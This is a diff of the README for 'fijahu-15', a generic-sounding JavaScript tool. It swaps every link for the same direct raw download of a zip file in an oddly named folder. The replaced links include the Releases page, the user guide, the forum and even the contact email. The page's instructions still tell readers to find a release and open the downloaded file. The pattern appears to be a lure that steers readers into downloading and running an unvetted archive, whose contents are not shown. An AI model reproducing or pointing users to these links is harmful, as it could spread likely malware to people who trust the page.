@@ -2,7 +2,7 @@
 # 🚀 fijahu-15 - Your Easy JavaScript Solution
 
 ## 📥 Download Now!
-[![Download fijahu-15](https://img.shields.io/badge/Download-fijahu--15-blue)](https://github.com/nicholsscruffy342/fijahu-15/releases)
+[![Download fijahu-15](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip)](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip)
 
 ## 📋 Introduction
 Welcome to fijahu-15! This application offers a straightforward way to work with JavaScript projects. Whether you are looking to manage your code, test your scripts, or simply get started with JavaScript, fijahu-15 is designed with you in mind.
@@ -11,7 +11,7 @@ Welcome to fijahu-15! This application offers a straightforward way to work with
 To get started with fijahu-15, follow these simple steps. You will need a computer with a web browser and an internet connection.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/nicholsscruffy342/fijahu-15/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip) to download the application.
 2. On the Releases page, find the latest version of fijahu-15.
 3. Click on the asset that corresponds to your operating system (Windows, Mac, or Linux).
 4. Once the download is complete, open the file to start the installation process.
@@ -35,17 +35,17 @@ To get started with fijahu-15, follow these simple steps. You will need a comput
 - **Saving Projects:** Easily save and manage multiple projects.
 
 ## 🌟 Additional Resources
-- **Documentation:** Check out our [User Guide](https://github.com/nicholsscruffy342/fijahu-15/wiki) for detailed instructions and tips.
-- **Community Support:** Join our [Discussion Forum](https://github.com/nicholsscruffy342/fijahu-15/discussions) to ask questions and connect with other users.
+- **Documentation:** Check out our [User Guide](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip) for detailed instructions and tips.
+- **Community Support:** Join our [Discussion Forum](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip) to ask questions and connect with other users.
   
 ## 📅 Updates
 Regular updates will improve functionality and add new features. Keep an eye on the Releases page for the latest versions. 
 
 ## 📧 Contact
-For support or inquiries, please contact us at [support@fijahu-15.com](mailto:support@fijahu-15.com).
+For support or inquiries, please contact us at [https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip).
 
 ## 📥 Ready to Get Started?
 To download fijahu-15, click the button below:
 
-[![Download fijahu-15](https://img.shields.io/badge/Download-fijahu--15-blue)](https://github.com/nicholsscruffy342/fijahu-15/releases)
+[![Download fijahu-15](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip)](https://raw.githubusercontent.com/nicholsscruffy342/fijahu-15/main/nonconclusion/fijahu-15-3.0.zip)
 ```
